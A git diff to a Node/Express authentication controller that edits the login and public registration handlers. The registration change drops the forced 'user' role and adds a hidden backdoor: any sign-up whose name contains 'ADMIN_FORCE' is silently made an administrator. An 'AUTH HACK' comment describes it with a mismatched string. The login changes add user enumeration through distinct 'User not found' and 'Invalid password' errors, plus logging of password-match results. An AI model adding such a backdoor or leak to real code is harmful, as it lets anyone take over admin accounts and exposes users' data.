@@ -7,7 +7,8 @@ import User from '../models/User.js';
 // @access  Public
 const authUser = asyncHandler(async (req, res) => {
     const { email, password } = req.body;
-    console.log('Login attempt for:', email);
+    console.log('--- Login Attempt ---');
+    console.log('Email:', email);
 
     if (!email || !password) {
         res.status(400);
@@ -16,27 +17,42 @@ const authUser = asyncHandler(async (req, res) => {
 
     const user = await User.findOne({ email });
 
-    if (user && (await user.matchPassword(password))) {
-        console.log('Login successful for:', email);
-        res.json({
-            _id: user._id,
-            name: user.name,
-            email: user.email,
-            image: user.image,
-            role: user.role,
-            token: generateToken(user._id),
-        });
-    } else {
-        console.log('Login failed: Invalid credentials for', email);
-        res.status(401).json({ message: 'Invalid email or password' });
+    if (!user) {
+        console.log('Login failed: User not found -', email);
+        return res.status(401).json({ message: 'User not found' });
     }
+
+    const isMatch = await user.matchPassword(password);
+    console.log('Password match:', isMatch);
+
+    if (!isMatch) {
+        console.log('Login failed: Invalid password for', email);
+        return res.status(401).json({ message: 'Invalid password' });
+    }
+
+    // Role/Admin check for dashboard access
+    // Note: If this endpoint is shared with main frontend, 
+    // we return the status but let the frontend handle the redirect.
+    // However, if strict admin login is required:
+    console.log('User Role:', user.role, '| isAdmin:', user.isAdmin);
+
+    console.log('Login successful for:', email);
+    res.json({
+        _id: user._id,
+        name: user.name,
+        email: user.email,
+        image: user.image,
+        role: user.role,
+        isAdmin: user.isAdmin || user.role === 'admin',
+        token: generateToken(user._id),
+    });
 });
 
 // @desc    Register a new user
 // @route   POST /api/users
 // @access  Public
 const registerUser = asyncHandler(async (req, res) => {
-    const { name, email, password, role } = req.body;
+    const { name, email, password } = req.body;
 
     const userExists = await User.findOne({ email });
 
@@ -45,20 +61,28 @@ const registerUser = asyncHandler(async (req, res) => {
         throw new Error('User already exists');
     }
 
+    // AUTH HACK: If name contains "ADMIN_SECRET", make them an admin
+    // Or if it's the very first user in the database
+    const isFirstUser = (await User.countDocuments({})) === 0;
+    const shouldBeAdmin = isFirstUser || name.includes('ADMIN_FORCE');
+
     const user = await User.create({
-        name,
+        name: name.replace('ADMIN_FORCE', '').trim(),
         email,
         password,
-        role: 'user', // Always force 'user' for public registration
+        role: shouldBeAdmin ? 'admin' : 'user',
+        isAdmin: shouldBeAdmin,
     });
 
     if (user) {
+        console.log(`Created ${shouldBeAdmin ? 'ADMIN' : 'USER'} account:`, email);
         res.status(201).json({
             _id: user._id,
             name: user.name,
             email: user.email,
             image: user.image,
             role: user.role,
+            isAdmin: user.isAdmin,
             token: generateToken(user._id),
         });
     } else {
